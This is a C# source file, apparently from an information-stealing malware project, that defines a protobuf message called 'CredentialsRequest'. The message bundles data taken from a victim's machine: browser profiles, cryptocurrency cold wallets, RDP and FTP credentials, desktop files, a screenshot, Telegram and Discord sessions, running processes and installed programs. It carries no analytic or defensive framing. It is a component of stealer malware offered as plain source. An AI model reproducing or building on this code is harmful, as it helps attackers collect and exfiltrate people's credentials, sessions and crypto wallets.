using NoiseMe.Drags.App.Models.Common;
using ProtoBuf;
using System.Collections.Generic;
using System.ComponentModel;

namespace NoiseMe.Drags.App.Models.Requests
{
	[ProtoContract(Name = "CredentialsRequest")]
	public class CredentialsRequest : INotifyPropertyChanged
	{
		private byte[] _screenshot;

		private List<FtpCredential> _ftpCredentials;

		private List<DesktopFile> _desktopFiles;

		private List<RdpCredential> _rdpConnections;

		private List<ColdWallet> _coldWallets;

		private List<BrowserProfile> _browserProfiles;

		private List<RemoteProcess> _processList;

		private List<string> _installedPrograms;

		private RemoteClientInformation _clientInformation;

		private TelegramSession _telegram;

		private DiscordSession _discord;

		private List<int> _tasksIds;

		[ProtoMember(1, Name = "ClientInformation")]
		public RemoteClientInformation ClientInformation
		{
			get
			{
				return _clientInformation;
			}
			set
			{
				_clientInformation = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("ClientInformation"));
			}
		}

		[ProtoMember(2, Name = "BrowserProfiles")]
		public List<BrowserProfile> BrowserProfiles
		{
			get
			{
				return _browserProfiles ?? (_browserProfiles = new List<BrowserProfile>());
			}
			set
			{
				_browserProfiles = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("BrowserProfiles"));
			}
		}

		[ProtoMember(3, Name = "ColdWallets")]
		public List<ColdWallet> ColdWallets
		{
			get
			{
				return _coldWallets ?? (_coldWallets = new List<ColdWallet>());
			}
			set
			{
				_coldWallets = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("BrowserProfiles"));
			}
		}

		[ProtoMember(4, Name = "RdpConnections")]
		public List<RdpCredential> RdpConnections
		{
			get
			{
				return _rdpConnections ?? (_rdpConnections = new List<RdpCredential>());
			}
			set
			{
				_rdpConnections = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("RdpConnections"));
			}
		}

		[ProtoMember(5, Name = "DesktopFiles")]
		public List<DesktopFile> DesktopFiles
		{
			get
			{
				return _desktopFiles ?? (_desktopFiles = new List<DesktopFile>());
			}
			set
			{
				_desktopFiles = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("DesktopFiles"));
			}
		}

		[ProtoMember(6, Name = "FtpCredentials")]
		public List<FtpCredential> FtpCredentials
		{
			get
			{
				return _ftpCredentials ?? (_ftpCredentials = new List<FtpCredential>());
			}
			set
			{
				_ftpCredentials = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("FtpCredentials"));
			}
		}

		[ProtoMember(7, Name = "Screenshot")]
		public byte[] Screenshot
		{
			get
			{
				return _screenshot;
			}
			set
			{
				_screenshot = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Screenshot"));
			}
		}

		[ProtoMember(8, Name = "TelegramSession")]
		public TelegramSession Telegram
		{
			get
			{
				return _telegram;
			}
			set
			{
				_telegram = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Telegram"));
			}
		}

		[ProtoMember(9, Name = "DiscordSession")]
		public DiscordSession Discord
		{
			get
			{
				return _discord;
			}
			set
			{
				_discord = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Discord"));
			}
		}

		[ProtoMember(10, Name = "RemoteProcess")]
		public List<RemoteProcess> ProcessList
		{
			get
			{
				return _processList;
			}
			set
			{
				_processList = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("ProcessList"));
			}
		}

		[ProtoMember(11, Name = "InstalledPrograms")]
		public List<string> InstalledPrograms
		{
			get
			{
				return _installedPrograms;
			}
			set
			{
				_installedPrograms = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("InstalledPrograms"));
			}
		}

		[ProtoMember(12, Name = "CompletedTasks")]
		public List<int> CompletedTasks
		{
			get
			{
				return _tasksIds;
			}
			set
			{
				_tasksIds = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("CompletedTasks"));
			}
		}

		public event PropertyChangedEventHandler PropertyChanged;
	}
}
